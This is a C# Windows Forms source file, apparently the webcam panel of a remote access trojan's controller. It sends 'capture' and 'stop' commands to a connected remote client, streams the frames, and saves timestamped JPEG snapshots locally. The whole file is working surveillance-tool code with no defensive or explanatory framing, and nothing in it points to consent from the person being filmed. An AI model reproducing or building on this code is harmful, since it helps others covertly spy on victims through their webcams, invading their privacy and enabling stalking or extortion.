using Server.MessagePack;
using Server.Connection;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Forms
{
    public partial class FormWebcam : Form
    {
        public Form1 F { get; set; }
        internal Clients Client { get; set; }
        internal Clients ParentClient { get; set; }
        public string FullPath { get; set; }

        public Stopwatch sw = Stopwatch.StartNew();
        public int FPS = 0;
        public bool SaveIt = false;
        public Image GetImage { get; set; }
        public FormWebcam()
        {
            InitializeComponent();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            try
            {
                if (button1.Tag == (object)"play")
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "webcam";
                    msgpack.ForcePathObject("Command").AsString = "capture";
                    msgpack.ForcePathObject("List").AsInteger = comboBox1.SelectedIndex;
                    msgpack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value);
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                    button1.Tag = (object)"stop";
                    button1.BackgroundImage = Properties.Resources.stop__1_;
                    numericUpDown1.Enabled = false;
                    comboBox1.Enabled = false;
                    btnSave.Enabled = true;
                }
                else
                {
                    button1.Tag = (object)"play";
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "webcam";
                    msgpack.ForcePathObject("Command").AsString = "stop";
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                    button1.BackgroundImage = Properties.Resources.play_button;
                    btnSave.BackgroundImage = Properties.Resources.save_image;
                    numericUpDown1.Enabled = true;
                    comboBox1.Enabled = true;
                    btnSave.Enabled = false;
                    timerSave.Stop();
                }
            }
            catch { }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected) this.Close();
            }
            catch { this.Close(); }
        }

        private void FormWebcam_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                ThreadPool.QueueUserWorkItem((o) =>
                {
                    Client?.Disconnected();
                });
            }
            catch { }
        }

        private void BtnSave_Click(object sender, EventArgs e)
        {
            if (button1.Tag == (object)"stop")
            {
                if (SaveIt)
                {
                    SaveIt = false;
                    //timerSave.Stop();
                    btnSave.BackgroundImage = Properties.Resources.save_image;
                }
                else
                {
                    btnSave.BackgroundImage = Properties.Resources.save_image2;
                    try
                    {
                        if (!Directory.Exists(FullPath))
                            Directory.CreateDirectory(FullPath);
                        Process.Start(FullPath);
                    }
                    catch { }
                    SaveIt = true;
                   // timerSave.Start();
                }
            }
        }

        private void TimerSave_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Directory.Exists(FullPath))
                    Directory.CreateDirectory(FullPath);
                pictureBox1.Image.Save(FullPath + $"\\IMG_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.jpeg", ImageFormat.Jpeg);
            }
            catch { }
        }
    }
}
